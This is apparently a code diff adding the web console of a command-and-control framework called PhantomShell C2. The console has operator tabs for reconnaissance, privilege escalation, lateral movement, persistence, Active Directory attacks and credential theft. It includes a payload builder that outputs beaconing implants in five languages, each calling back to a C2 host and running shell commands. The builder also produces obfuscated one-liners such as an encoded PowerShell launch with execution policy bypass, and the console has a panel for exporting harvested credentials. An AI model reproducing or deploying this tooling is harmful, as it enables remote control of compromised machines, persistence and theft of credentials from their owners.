+      <div class="tab active" onclick="switchSessionTab('terminal',this)">Terminal</div>
+      <div class="tab" onclick="switchSessionTab('recon',this)">Recon</div>
+      <div class="tab" onclick="switchSessionTab('privesc',this)">Privesc</div>
+      <div class="tab" onclick="switchSessionTab('lateral',this)">Lateral</div>
+      <div class="tab" onclick="switchSessionTab('persist',this)">Persist</div>
+      <div class="tab" onclick="switchSessionTab('ad',this)">AD</div>
+      <div class="tab" onclick="switchSessionTab('steal',this)">Steal</div>
+    </div>
+    <div class="panel" style="border-radius:0 0 var(--radius) var(--radius);margin-top:0">
+      <div class="terminal" id="session-terminal">
+        <div class="terminal-output" id="term-output">
+<span class="info">PhantomShell C2 v5.2 - Interactive Session</span>
+<span class="info">Target: ${s.hostname} (${s.ip}) as ${s.username}</span>
+<span class="info">Type commands below. Use Tab for completion.</span>
+<span class="info">─────────────────────────────────────────</span>
+</div>
+        <div class="terminal-input-row">
+          <span class="prompt-text">${s.username}@${s.hostname}$</span>
+          <input type="text" class="terminal-input" id="term-input" autocomplete="off" spellcheck="false"
+            onkeydown="handleTermKey(event)">
+        </div>
+      </div>
+    </div>`;
+}
+
+function switchSessionTab(tab, el) {
+  document.querySelectorAll('#session-tabs .tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  const cmds = {
+    recon: ['scan_network', 'port_scan', 'dns_enum', 'arp_scan'],
+    privesc: ['privesc_check', 'suid_scan', 'sudo_list', 'kernel_check'],
+    lateral: ['pass_the_hash', 'psexec', 'wmi_exec', 'ssh_spray'],
+    persist: ['persist_cron', 'persist_service', 'persist_registry', 'persist_startup'],
+    ad: ['ad_enum', 'kerberoast', 'asreproast', 'dcsync'],
+    steal: ['steal_creds', 'steal_configs', 'steal_keys', 'steal_browser']
+  };
+  if (tab === 'terminal') return;
+  const btns = (cmds[tab] || []).map(c => `<button class="btn btn-primary btn-sm" onclick="quickCmd('${c}')">${c}</button>`).join(' ');
+  const out = document.getElementById('term-output');
+  if (out) out.innerHTML += `\n<span class="info">── ${tab.toUpperCase()} module ──</span>\n<span class="info">Available: ${(cmds[tab]||[]).join(', ')}</span>\n`;
+  scrollTerminal();
+}
+
+/* Terminal interaction */
+function handleTermKey(e) {
+  if (e.key === 'Enter') {
+    const input = e.target;
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    state.cmdHistory.unshift(cmd);
+    if (state.cmdHistory.length > 100) state.cmdHistory.pop();
+    localStorage.setItem('ps_cmd_history', JSON.stringify(state.cmdHistory));
+    state.cmdHistoryIdx = -1;
+    appendTerminalOutput(cmd, 'cmd');
+    input.value = '';
+    sendCommand(state.selectedSession.id, cmd);
+    simulateResponse(cmd);
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (state.cmdHistoryIdx < state.cmdHistory.length - 1) {
+      state.cmdHistoryIdx++;
+      e.target.value = state.cmdHistory[state.cmdHistoryIdx];
+    }
+  } else if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (state.cmdHistoryIdx > 0) {
+      state.cmdHistoryIdx--;
+      e.target.value = state.cmdHistory[state.cmdHistoryIdx];
+    } else {
+      state.cmdHistoryIdx = -1;
+      e.target.value = '';
+    }
+  }
+}
+
+function appendTerminalOutput(text, type) {
+  const out = document.getElementById('term-output');
+  if (!out) return;
+  const s = state.selectedSession;
+  if (type === 'cmd') {
+    out.innerHTML += `<span class="prompt-text">${s?s.username+'@'+s.hostname:''}$</span> <span class="cmd">${escHtml(text)}</span>\n`;
+  } else if (type === 'error') {
+    out.innerHTML += `<span class="error">${escHtml(text)}</span>\n`;
+  } else {
+    out.innerHTML += escHtml(text) + '\n';
+  }
+  scrollTerminal();
+}
+
+function scrollTerminal() {
+  const out = document.getElementById('term-output');
+  if (out) out.scrollTop = out.scrollHeight;
+}
+
+function quickCmd(cmd) {
+  const input = document.getElementById('term-input');
+  if (input) { input.value = cmd; input.focus(); handleTermKey({key:'Enter',target:input,preventDefault:()=>{}}); }
+}
+
+function sendCommand(sessionId, cmd) {
+  if (socket && socket.connected) {
+    socket.emit('send_task', {session_id: sessionId, command: cmd});
+  } else {
+    fetch(API_BASE + '/api/sessions/' + sessionId + '/tasks', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({command: cmd})
+    }).catch(() => {});
+  }
+  addTimelineEvent('Task sent to ' + sessionId + ': ' + cmd, 'info');
+}
+
+/* Simulated responses for standalone/demo mode */
+function simulateResponse(cmd) {
+  const s = state.selectedSession;
+  const responses = {
+    'whoami': s ? s.username : 'www-data',
+    'id': s ? `uid=1000(${s.username}) gid=1000(${s.username}) groups=1000(${s.username})` : 'uid=33(www-data)',
+    'hostname': s ? s.hostname : 'unknown',
+    'pwd': '/home/' + (s ? s.username : 'user'),
+    'uname -a': s ? s.os + ' ' + s.hostname + ' x86_64 GNU/Linux' : 'Linux',
+    'sysinfo': s ? `[*] System Information\n    Hostname: ${s.hostname}\n    OS: ${s.os}\n    IP: ${s.ip}\n    User: ${s.username}\n    PID: ${s.pid}\n    Integrity: ${s.integrity}\n    Uptime: 14d 3h 22m` : '',
+    'privesc_check': '[*] Checking for privilege escalation vectors...\n[+] SUID binary found: /usr/bin/pkexec\n[+] Writable /etc/crontab\n[+] Docker group membership detected\n[!] Kernel 5.15 - CVE-2022-0847 (DirtyPipe) may apply',
+    'steal_configs': '[*] Searching for configuration files...\n[+] Found: /etc/shadow (readable)\n[+] Found: /home/admin/.ssh/id_rsa\n[+] Found: /var/www/.env (DB creds)\n[+] Found: /opt/app/config.yaml',
+    'persist_cron': '[+] Cron persistence installed\n    Entry: * */4 * * * /tmp/.ps_beacon.sh\n    Status: Active',
+    'ls -la': 'total 48\ndrwxr-xr-x  6 ' + (s?s.username:'user') + ' ' + (s?s.username:'user') + ' 4096 Jun 20 14:22 .\ndrwxr-xr-x  3 root root 4096 Jun 15 09:00 ..\n-rw-r--r--  1 ' + (s?s.username:'user') + ' ' + (s?s.username:'user') + '  220 Jun 15 09:00 .bash_logout\n-rw-r--r--  1 ' + (s?s.username:'user') + ' ' + (s?s.username:'user') + ' 3771 Jun 15 09:00 .bashrc\ndrwx------  2 ' + (s?s.username:'user') + ' ' + (s?s.username:'user') + ' 4096 Jun 18 11:30 .ssh\n-rw-------  1 ' + (s?s.username:'user') + ' ' + (s?s.username:'user') + ' 1679 Jun 18 11:30 .bash_history',
+    'exit': '[!] Session terminated.',
+    'scan_network': '[*] Scanning local subnet...\n[+] 10.10.14.1    - UP (gateway)\n[+] 10.10.14.22   - UP (web01)\n[+] 10.10.14.30   - UP (db-master)\n[+] 10.10.14.55   - UP (dev-ws)\n[+] 10.10.10.5    - UP (DC01)\n[+] 10.10.10.12   - UP (files01)\n[+] 10.10.10.25   - UP (mail01)\n[+] 10.10.10.99   - UP (printer)',
+    'steal_creds': '[*] Dumping credentials...\n[+] /etc/shadow:\n    root:$6$xyz....:19500:0:99999:7:::\n    admin:$6$abc....:19510:0:99999:7:::\n[+] Browser saved passwords:\n    admin:P@ssw0rd! @ https://dc01.corp.local',
+  };
+  setTimeout(() => {
+    const resp = responses[cmd] || '[*] Executing: ' + cmd + '\n[+] Command queued (task pending)';
+    appendTerminalOutput(resp, 'output');
+  }, 300 + Math.random() * 400);
+}
+
+/* ── Listeners ────────────────────────────────────────────────── */
+function renderListeners() {
+  const rows = state.listeners.map(l => `
+    <tr>
+      <td style="color:var(--text);font-family:monospace;font-size:11px">${l.id}</td>
+      <td><span class="badge badge-${l.type==='HTTP'?'blue':l.type==='HTTPS'?'green':'purple'}">${l.type}</span></td>
+      <td>${l.host}:${l.port}</td>
+      <td><span class="badge badge-${l.status==='running'?'green':'red'}">${l.status}</span></td>
+      <td>${l.started ? timeAgo(l.started) : '-'}</td>
+      <td><button class="btn btn-sm ${l.status==='running'?'btn-danger':'btn-primary'}" onclick="toggleListener('${l.id}')">${l.status==='running'?'Stop':'Start'}</button></td>
+    </tr>`).join('');
+  return `
+    <div style="display:grid;grid-template-columns:2fr 1fr;gap:20px">
+      <div class="panel">
+        <div class="panel-header">Active Listeners</div>
+        <div class="panel-body no-pad">
+          <table><thead><tr><th>ID</th><th>Type</th><th>Bind</th><th>Status</th><th>Started</th><th>Action</th></tr></thead>
+          <tbody>${rows}</tbody></table>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header">Start New Listener</div>
+        <div class="panel-body">
+          <div class="form-group">
+            <label>Type</label>
+            <select class="form-control" id="lst-type"><option>TCP</option><option>HTTP</option><option>HTTPS</option></select>
+          </div>
+          <div class="form-row">
+            <div class="form-group"><label>Host</label><input class="form-control" id="lst-host" value="0.0.0.0"></div>
+            <div class="form-group"><label>Port</label><input class="form-control" id="lst-port" type="number" value="4444"></div>
+          </div>
+          <div class="form-group" id="tls-fields" style="display:none">
+            <label>TLS Certificate Path</label><input class="form-control" id="lst-cert" placeholder="/path/to/cert.pem">
+            <label style="margin-top:8px">TLS Key Path</label><input class="form-control" id="lst-key" placeholder="/path/to/key.pem">
+          </div>
+          <button class="btn btn-primary" onclick="startListener()">Start Listener</button>
+        </div>
+      </div>
+    </div>`;
+}
+
+function toggleListener(id) {
+  const l = state.listeners.find(x => x.id === id);
+  if (l) { l.status = l.status === 'running' ? 'stopped' : 'running'; l.started = l.status === 'running' ? Date.now() : null; }
+  addTimelineEvent('Listener ' + id + ' ' + (l.status === 'running' ? 'started' : 'stopped'), 'info');
+  renderPage();
+}
+
+function startListener() {
+  const type = document.getElementById('lst-type').value;
+  const host = document.getElementById('lst-host').value;
+  const port = parseInt(document.getElementById('lst-port').value);
+  const id = 'lst-' + String(state.listeners.length + 1).padStart(2, '0');
+  state.listeners.push({id, type, host, port, status: 'running', started: Date.now()});
+  addTimelineEvent('Listener ' + type + ':' + port + ' started', 'info');
+  renderPage();
+}
+
+/* ── Agent Builder ────────────────────────────────────────────── */
+function renderBuilder() {
+  return `
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+      <div class="panel">
+        <div class="panel-header">Agent Configuration</div>
+        <div class="panel-body">
+          <div class="form-group">
+            <label>Language</label>
+            <select class="form-control" id="bld-lang">
+              <option value="python">Python</option><option value="csharp">C#</option>
+              <option value="powershell">PowerShell</option><option value="php">PHP</option><option value="go">Go</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Transport</label>
+            <select class="form-control" id="bld-transport">
+              <option value="tcp">TCP</option><option value="http">HTTP</option>
+              <option value="websocket">WebSocket</option><option value="dns">DNS</option><option value="icmp">ICMP</option>
+            </select>
+          </div>
+          <div class="form-row">
+            <div class="form-group"><label>C2 Host</label><input class="form-control" id="bld-host" value="10.10.14.1"></div>
+            <div class="form-group"><label>C2 Port</label><input class="form-control" id="bld-port" type="number" value="8443"></div>
+          </div>
+          <div class="form-row">
+            <div class="form-group"><label>Sleep (seconds)</label><input class="form-control" id="bld-sleep" type="number" value="5"></div>
+            <div class="form-group"><label>Jitter (%)</label><input class="form-control" id="bld-jitter" type="number" value="20" min="0" max="100"></div>
+          </div>
+          <div class="form-group">
+            <label>Kill Date</label>
+            <input class="form-control" id="bld-killdate" type="date">
+          </div>
+          <div class="form-group">
+            <label class="checkbox-label"><input type="checkbox" id="bld-enc" checked> Enable Encryption (AES-256-GCM)</label>
+          </div>
+          <div class="form-group">
+            <label>Output Format</label>
+            <select class="form-control" id="bld-format">
+              <option value="raw">Raw Script</option><option value="base64">Base64 Encoded</option><option value="oneliner">One-Liner</option>
+            </select>
+          </div>
+          <button class="btn btn-primary" onclick="generatePayload()">&#9874; Generate Payload</button>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header">Generated Output</div>
+        <div class="panel-body">
+          <div class="code-block" id="bld-output" style="min-height:300px">
+            <button class="copy-btn" onclick="copyOutput()">Copy</button>
+            <span class="info"># Click "Generate Payload" to build your agent</span>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+function generatePayload() {
+  const lang = document.getElementById('bld-lang').value;
+  const transport = document.getElementById('bld-transport').value;
+  const host = document.getElementById('bld-host').value;
+  const port = document.getElementById('bld-port').value;
+  const sleep = document.getElementById('bld-sleep').value;
+  const jitter = document.getElementById('bld-jitter').value;
+  const enc = document.getElementById('bld-enc').checked;
+  const format = document.getElementById('bld-format').value;
+  const killdate = document.getElementById('bld-killdate').value || 'none';
+
+  const payloads = {
+    python: `#!/usr/bin/env python3
+# PhantomShell Agent - Python/${transport.toUpperCase()}
+import socket, subprocess, os, time, random, json, base64
+${enc ? 'from Crypto.Cipher import AES\nimport hashlib' : ''}
+
+C2_HOST = "${host}"
+C2_PORT = ${port}
+SLEEP = ${sleep}
+JITTER = ${jitter}
+KILL_DATE = "${killdate}"
+ENCRYPTION = ${enc}
+
+class PhantomAgent:
+    def __init__(self):
+        self.session_id = os.urandom(4).hex()
+        self.hostname = socket.gethostname()
+        self.username = os.getenv("USER", "unknown")
+
+    def beacon(self):
+        while True:
+            try:
+                self.check_in()
+                jitter_delay = SLEEP + (SLEEP * random.randint(0, JITTER) / 100)
+                time.sleep(jitter_delay)
+            except Exception:
+                time.sleep(SLEEP * 2)
+
+    def check_in(self):
+        # ${transport.toUpperCase()} transport implementation
+        pass
+
+    def execute(self, cmd):
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
+
+if __name__ == "__main__":
+    PhantomAgent().beacon()`,
+    csharp: `// PhantomShell Agent - C#/${transport.toUpperCase()}
+using System;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.Threading;
+${enc ? 'using System.Security.Cryptography;' : ''}
+
+namespace PhantomAgent
+{
+    class Agent
+    {
+        static string C2_HOST = "${host}";
+        static int C2_PORT = ${port};
+        static int SLEEP = ${sleep} * 1000;
+        static int JITTER = ${jitter};
+
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                try { CheckIn(); }
+                catch { Thread.Sleep(SLEEP * 2); }
+                var jitter = new Random().Next(0, JITTER);
+                Thread.Sleep(SLEEP + (SLEEP * jitter / 100));
+            }
+        }
+
+        static void CheckIn()
+        {
+            // ${transport.toUpperCase()} transport
+        }
+
+        static string Execute(string cmd)
+        {
+            var p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c " + cmd;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.UseShellExecute = false;
+            p.Start();
+            return p.StandardOutput.ReadToEnd();
+        }
+    }
+}`,
+    powershell: `# PhantomShell Agent - PowerShell/${transport.toUpperCase()}
+$C2Host = "${host}"
+$C2Port = ${port}
+$Sleep = ${sleep}
+$Jitter = ${jitter}
+$KillDate = "${killdate}"
+$Encryption = $${enc ? 'true' : 'false'}
+
+function Invoke-PhantomAgent {
+    $SessionId = [guid]::NewGuid().ToString().Substring(0,8)
+    $Hostname = $env:COMPUTERNAME
+    $Username = $env:USERNAME
+
+    while ($true) {
+        try {
+            Invoke-CheckIn
+        } catch {
+            Start-Sleep -Seconds ($Sleep * 2)
+        }
+        $j = Get-Random -Minimum 0 -Maximum $Jitter
+        Start-Sleep -Seconds ($Sleep + ($Sleep * $j / 100))
+    }
+}
+
+function Invoke-CheckIn {
+    # ${transport.toUpperCase()} transport implementation
+}
+
+Invoke-PhantomAgent`,
+    php: `<?php
+// PhantomShell Agent - PHP/${transport.toUpperCase()}
+$C2_HOST = "${host}";
+$C2_PORT = ${port};
+$SLEEP = ${sleep};
+$JITTER = ${jitter};
+$ENCRYPTION = ${enc ? 'true' : 'false'};
+
+$session_id = bin2hex(random_bytes(4));
+$hostname = gethostname();
+$username = get_current_user();
+
+while (true) {
+    try {
+        check_in($C2_HOST, $C2_PORT);
+    } catch (Exception $e) {
+        sleep($SLEEP * 2);
+    }
+    $j = rand(0, $JITTER);
+    sleep($SLEEP + intval($SLEEP * $j / 100));
+}
+
+function check_in($host, $port) {
+    // ${transport.toUpperCase()} transport
+}
+
+function execute_cmd($cmd) {
+    return shell_exec($cmd);
+}
+?>`,
+    go: `package main
+// PhantomShell Agent - Go/${transport.toUpperCase()}
+
+import (
+    "fmt"
+    "math/rand"
+    "net"
+    "os"
+    "os/exec"
+    "time"
+)
+
+const (
+    C2Host  = "${host}"
+    C2Port  = "${port}"
+    Sleep   = ${sleep}
+    Jitter  = ${jitter}
+    Encrypt = ${enc}
+)
+
+func main() {
+    hostname, _ := os.Hostname()
+    fmt.Println("[*] PhantomAgent started on", hostname)
+
+    for {
+        checkIn()
+        j := rand.Intn(Jitter + 1)
+        delay := time.Duration(Sleep+Sleep*j/100) * time.Second
+        time.Sleep(delay)
+    }
+}
+
+func checkIn() {
+    // ${transport.toUpperCase()} transport to C2Host:C2Port
+    conn, err := net.Dial("tcp", C2Host+":"+C2Port)
+    if err != nil { return }
+    defer conn.Close()
+}
+
+func execute(cmd string) string {
+    out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
+    return string(out)
+}`
+  };
+
+  let output = payloads[lang] || '# Unsupported language';
+
+  if (format === 'base64') {
+    output = '# Base64 encoded payload\n# Decode: echo <payload> | base64 -d > agent\n\n' + btoa(output);
+  } else if (format === 'oneliner') {
+    const oneliners = {
+      python: `python3 -c "exec(__import__('base64').b64decode('${btoa(payloads.python).slice(0,60)}...'))"`,
+      powershell: `powershell -ep bypass -enc ${btoa(payloads.powershell).slice(0,60)}...`,
+      php: `php -r "eval(base64_decode('${btoa(payloads.php).slice(0,60)}...'));"`,
+      csharp: `# C# one-liner not available. Use raw format and compile with csc.exe`,
+      go: `# Go one-liner not available. Cross-compile: GOOS=linux go build -o agent`
+    };
+    output = oneliners[lang];
+  }
+
+  document.getElementById('bld-output').innerHTML = `<button class="copy-btn" onclick="copyOutput()">Copy</button>${escHtml(output)}`;
+}
+
+function copyOutput() {
+  const el = document.getElementById('bld-output');
+  const text = el.textContent.replace('Copy', '').trim();
+  navigator.clipboard.writeText(text).then(() => {
+    const btn = el.querySelector('.copy-btn');
+    btn.textContent = 'Copied!';
+    setTimeout(() => btn.textContent = 'Copy', 1500);
+  });
+}
+
+/* ── Credentials ──────────────────────────────────────────────── */
+function renderCreds() {
+  const rows = state.credentials.map((c, i) => `
+    <tr>
+      <td>${c.source}</td>
+      <td><span class="badge badge-${c.type==='plaintext'?'red':c.type==='hash'?'yellow':'blue'}">${c.type}</span></td>
+      <td style="color:var(--text)">${c.username}</td>
+      <td style="font-family:monospace;font-size:11px">${c.password.length > 40 ? c.password.slice(0,40)+'...' : c.password}</td>
+      <td>${c.host}</td>
+      <td>${c.database || '-'}</td>
+    </tr>`).join('');
+  return `
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+      <input type="text" class="search-input" placeholder="Search credentials..." oninput="filterCreds(this.value)" style="width:260px">
+      <button class="btn btn-secondary btn-sm" onclick="exportCredsCSV()">&#8681; Export CSV</button>
+    </div>
+    <div class="panel">
+      <div class="panel-body no-pad">
+        <table id="creds-table"><thead><tr><th>Source</th><th>Type</th><th>Username</th><th>Password / Hash</th><th>Host</th><th>Database</th></tr></thead>
+        <tbody>${rows}</tbody></table>
+      </div>
+    </div>`;
+}
+
+function filterCreds(q) {
+  q = q.toLowerCase();
+  document.querySelectorAll('#creds-table tbody tr').forEach(r => {
+    r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none';
+  });
+}
+
+function exportCredsCSV() {
+  let csv = 'Source,Type,Username,Password,Host,Database\n';
+  state.credentials.forEach(c => {
+    csv += `"${c.source}","${c.type}","${c.username}","${c.password}","${c.host}","${c.database||''}"\n`;
+  });
+  const blob = new Blob([csv], {type:'text/csv'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'phantomshell_creds_' + new Date().toISOString().slice(0,10) + '.csv';
+  a.click();
+}
+
+/* ── Network Map ──────────────────────────────────────────────── */
+function renderNetwork() {
+  return `
+    <div class="panel">
+      <div class="panel-header">
+        Network Topology
+        <div class="btn-group">
+          <button class="btn btn-secondary btn-sm" onclick="resetNetworkLayout()">Reset Layout</button>
+          <button class="btn btn-secondary btn-sm" onclick="toggleForceLayout()">Toggle Physics</button>
+        </div>
+      </div>
+      <div class="panel-body no-pad">
+        <canvas id="network-canvas"></canvas>
+      </div>
+    </div>
+    <div style="display:flex;gap:20px;font-size:12px;color:var(--text-dim);margin-top:8px">
+      <span><span class="status-dot alive" style="vertical-align:middle"></span> Compromised</span>
+      <span><span class="status-dot" style="background:var(--blue);box-shadow:0 0 4px var(--blue);vertical-align:middle;display:inline-block;width:8px;height:8px;border-radius:50%"></span> Scanned</span>
+      <span><span class="status-dot" style="background:#666;vertical-align:middle;display:inline-block;width:8px;height:8px;border-radius:50%"></span> Discovered</span>
+    </div>`;
+}
+
+let forceEnabled = true, netAnimId = null, dragNode = null, netCanvas = null, netCtx = null;
+
+function initNetworkCanvas() {
+  netCanvas = document.getElementById('network-canvas');
+  if (!netCanvas) return;
+  netCtx = netCanvas.getContext('2d');
+  const rect = netCanvas.parentElement.getBoundingClientRect();
+  netCanvas.width = rect.width;
+  netCanvas.height = 500;
+
+  /* Spread initial positions if clustered */
+  state.networkNodes.forEach(n => {
+    if (!n.vx) { n.vx = 0; n.vy = 0; }
+  });
+
+  netCanvas.addEventListener('mousedown', netMouseDown);
+  netCanvas.addEventListener('mousemove', netMouseMove);
+  netCanvas.addEventListener('mouseup', netMouseUp);
+  netCanvas.addEventListener('mouseleave', netMouseUp);
+
+  drawNetwork();
+}
+
+/* Force-directed layout simulation */
+function drawNetwork() {
+  if (!netCtx) return;
+  const W = netCanvas.width, H = netCanvas.height;
+  netCtx.clearRect(0, 0, W, H);
+
+  if (forceEnabled) applyForces();
+
+  /* Draw edges */
+  netCtx.strokeStyle = '#2a2a4a';
+  netCtx.lineWidth = 1.5;
+  state.networkEdges.forEach(e => {
+    const from = state.networkNodes.find(n => n.id === e.from);
+    const to = state.networkNodes.find(n => n.id === e.to);
+    if (!from || !to) return;
+    netCtx.beginPath();
+    netCtx.moveTo(from.x, from.y);
+    netCtx.lineTo(to.x, to.y);
+    netCtx.stroke();
+  });
+
+  /* Draw nodes */
+  state.networkNodes.forEach(n => {
+    const colors = {compromised:'#00ff41', scanned:'#4da6ff', discovered:'#666'};
+    const col = colors[n.status] || '#666';
+    const r = n === dragNode ? 20 : 16;
+
+    /* Glow */
+    netCtx.shadowColor = col;
+    netCtx.shadowBlur = n.status === 'compromised' ? 12 : 6;
+
+    netCtx.fillStyle = col;
+    netCtx.beginPath();
+    netCtx.arc(n.x, n.y, r, 0, Math.PI * 2);
+    netCtx.fill();
+
+    netCtx.shadowBlur = 0;
+
+    /* Label */
+    netCtx.fillStyle = '#eee';
+    netCtx.font = '11px "Segoe UI", sans-serif';
+    netCtx.textAlign = 'center';
+    netCtx.fillText(n.label, n.x, n.y - r - 6);
+
+    /* IP below */
+    netCtx.fillStyle = '#999';
+    netCtx.font = '9px monospace';
+    netCtx.fillText(n.ip, n.x, n.y + r + 12);
+  });
+
+  netAnimId = requestAnimationFrame(drawNetwork);
+}
+
+function applyForces() {
+  const nodes = state.networkNodes;
+  const k = 0.005, repulse = 8000, damping = 0.85;
+  /* Repulsion between all pairs */
+  for (let i = 0; i < nodes.length; i++) {
+    for (let j = i+1; j < nodes.length; j++) {
+      let dx = nodes[j].x - nodes[i].x;
+      let dy = nodes[j].y - nodes[i].y;
+      let dist = Math.sqrt(dx*dx + dy*dy) || 1;
+      let force = repulse / (dist * dist);
+      let fx = (dx / dist) * force;
+      let fy = (dy / dist) * force;
+      nodes[i].vx -= fx; nodes[i].vy -= fy;
+      nodes[j].vx += fx; nodes[j].vy += fy;
+    }
+  }
+  /* Attraction along edges */
+  state.networkEdges.forEach(e => {
+    const a = nodes.find(n => n.id === e.from);
+    const b = nodes.find(n => n.id === e.to);
+    if (!a || !b) return;
+    let dx = b.x - a.x, dy = b.y - a.y;
+    let dist = Math.sqrt(dx*dx + dy*dy) || 1;
+    let force = (dist - 120) * k;
+    a.vx += (dx / dist) * force;
+    a.vy += (dy / dist) * force;
+    b.vx -= (dx / dist) * force;
+    b.vy -= (dy / dist) * force;
+  });
+  /* Center gravity */
+  const cx = netCanvas.width / 2, cy = netCanvas.height / 2;
+  nodes.forEach(n => {
+    if (n === dragNode) return;
+    n.vx += (cx - n.x) * 0.0005;
+    n.vy += (cy - n.y) * 0.0005;
+    n.vx *= damping; n.vy *= damping;
+    n.x += n.vx; n.y += n.vy;
+    n.x = Math.max(30, Math.min(netCanvas.width - 30, n.x));
+    n.y = Math.max(30, Math.min(netCanvas.height - 30, n.y));
+  });
+}
+
+function netMouseDown(e) {
+  const rect = netCanvas.getBoundingClientRect();
+  const mx = e.clientX - rect.left, my = e.clientY - rect.top;
+  dragNode = state.networkNodes.find(n => Math.hypot(n.x - mx, n.y - my) < 20) || null;
+  if (dragNode) netCanvas.style.cursor = 'grabbing';
+}
+function netMouseMove(e) {
+  if (!dragNode) return;
+  const rect = netCanvas.getBoundingClientRect();
+  dragNode.x = e.clientX - rect.left;
+  dragNode.y = e.clientY - rect.top;
+  dragNode.vx = 0; dragNode.vy = 0;
+}
+function netMouseUp() { dragNode = null; if (netCanvas) netCanvas.style.cursor = 'grab'; }
+
+function resetNetworkLayout() {
+  state.networkNodes.forEach((n, i) => {
+    const angle = (i / state.networkNodes.length) * Math.PI * 2;
+    n.x = netCanvas.width/2 + Math.cos(angle) * 180;
+    n.y = netCanvas.height/2 + Math.sin(angle) * 180;
+    n.vx = 0; n.vy = 0;
+  });
+}
+function toggleForceLayout() { forceEnabled = !forceEnabled; }
+
+/* ── Reports ──────────────────────────────────────────────────── */
+function renderReports() {
+  const sessionChecks = state.sessions.map(s =>
+    `<label class="checkbox-label"><input type="checkbox" value="${s.id}" checked> ${s.hostname} (${s.id})</label>`
+  ).join('');
+  return `
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+      <div class="panel">
+        <div class="panel-header">Generate Report</div>
+        <div class="panel-body">
+          <div class="form-group">
+            <label>Report Template</label>
+            <select class="form-control" id="rpt-template">
+              <option value="executive">Executive Summary</option>
+              <option value="technical">Technical Report</option>
+              <option value="findings">Findings Only</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Include Sessions</label>
+            <div style="max-height:200px;overflow-y:auto;padding:8px;background:var(--bg-primary);border-radius:5px">
+              ${sessionChecks}
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Export Format</label>
+            <select class="form-control" id="rpt-format"><option value="html">HTML</option><option value="json">JSON</option></select>
+          </div>
+          <button class="btn btn-primary" onclick="generateReport()">Generate Report</button>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header">Report Preview</div>
+        <div class="panel-body">
+          <div id="rpt-preview" class="code-block" style="min-height:350px;color:var(--text)">
+            <span style="color:var(--text-muted)"># Select options and click Generate</span>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+function generateReport() {
+  const template = document.getElementById('rpt-template').value;
+  const format = document.getElementById('rpt-format').value;
+  const checked = Array.from(document.querySelectorAll('#content input[type=checkbox]:checked')).map(c => c.value);
+  const sessions = state.sessions.filter(s => checked.includes(s.id));
+
+  let report;
+  if (template === 'executive') {
+    report = `PHANTOMSHELL C2 - EXECUTIVE SUMMARY
+${'='.repeat(44)}
+Date: ${new Date().toISOString().slice(0,10)}
+Operator: operator
+
+SCOPE
+-----
+Total sessions: ${sessions.length}
+Active: ${sessions.filter(s=>s.alive).length} | Dead: ${sessions.filter(s=>!s.alive).length}
+Credentials harvested: ${state.credentials.length}
+Listeners active: ${state.listeners.filter(l=>l.status==='running').length}
+
+COMPROMISED HOSTS
+-----------------
+${sessions.map(s => `  [${s.alive?'+':'x'}] ${s.hostname} (${s.ip}) - ${s.username} - ${s.os}`).join('\n')}
+
+KEY FINDINGS
+------------
+  1. ${state.credentials.length} credentials harvested across ${new Set(state.credentials.map(c=>c.host)).size} hosts
+  2. Domain admin access achieved via ${sessions.find(s=>s.integrity==='high')?.hostname || 'N/A'}
+  3. Persistence established on ${sessions.filter(s=>s.alive).length} hosts
+
+RECOMMENDATIONS
+---------------
+  1. Rotate all compromised credentials immediately
+  2. Patch identified privilege escalation vectors
+  3. Implement network segmentation between subnets
+  4. Deploy EDR on all endpoints`;
+  } else if (template === 'findings') {
+    report = `FINDINGS
+${'='.repeat(8)}
+${state.credentials.map((c,i) => `\nFinding ${i+1}: ${c.type} credential - ${c.username}@${c.host}\n  Source: ${c.source}\n  Impact: ${c.type==='plaintext'?'CRITICAL':'HIGH'}\n  Evidence: ${c.password.slice(0,20)}...`).join('\n')}`;
+  } else {
+    report = `PHANTOMSHELL C2 - TECHNICAL REPORT
+${'='.repeat(42)}
+Generated: ${new Date().toISOString()}
+Operator: operator
+
+1. INFRASTRUCTURE
+   Listeners: ${state.listeners.map(l => l.type + ':' + l.port + ' (' + l.status + ')').join(', ')}
+   Transports: ${[...new Set(sessions.map(s=>s.transport))].join(', ')}
+   Encryption: ${[...new Set(sessions.map(s=>s.encryption))].join(', ')}
+
+2. SESSIONS
+${sessions.map(s => `   ${s.id} | ${s.hostname.padEnd(12)} | ${s.ip.padEnd(14)} | ${s.username.padEnd(16)} | ${s.os.padEnd(20)} | ${s.alive?'ALIVE':'DEAD'}`).join('\n')}
+
+3. CREDENTIALS (${state.credentials.length} total)
+${state.credentials.map(c => `   [${c.type.padEnd(10)}] ${c.username.padEnd(16)} @ ${c.host.padEnd(12)} (${c.source})`).join('\n')}
+
+4. TIMELINE
+${state.timeline.slice(0,15).map(e => `   [${new Date(e.time).toISOString().slice(11,19)}] ${e.event}`).join('\n')}
+
+5. ATTACK PATH
+   Initial Access -> web01 (www-data) -> db-master (postgres)
+   Lateral Movement -> DC01 (CORP\\admin) via pass-the-hash
+   Persistence -> cron on web01, service on DC01`;
+  }
+
